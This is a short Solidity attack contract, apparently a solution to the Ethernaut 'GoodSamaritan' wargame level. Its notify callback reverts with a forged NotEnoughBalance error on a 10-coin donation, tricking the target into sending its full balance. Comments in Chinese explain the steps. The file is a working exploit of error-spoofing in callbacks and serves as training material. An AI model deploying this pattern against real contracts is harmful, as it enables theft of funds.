// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IGoodSamaritan {
    function requestDonation() external returns (bool);
}

interface INotifyable {
    function notify(uint256 amount) external;
}

contract GoodSamaritanAttack is INotifyable {
    error NotEnoughBalance();
    
    IGoodSamaritan public target;
    
    constructor(address _target) {
        target = IGoodSamaritan(_target);
    }
    
    function attack() external {
        target.requestDonation();
    }
    
    function notify(uint256 amount) external override {
        // 如果是小额捐赠（10 coins），抛出伪造的错误
        if (amount == 10) {
            revert NotEnoughBalance();
        }
        // 如果是全部余额转账（1,000,000），正常接收
    }
}
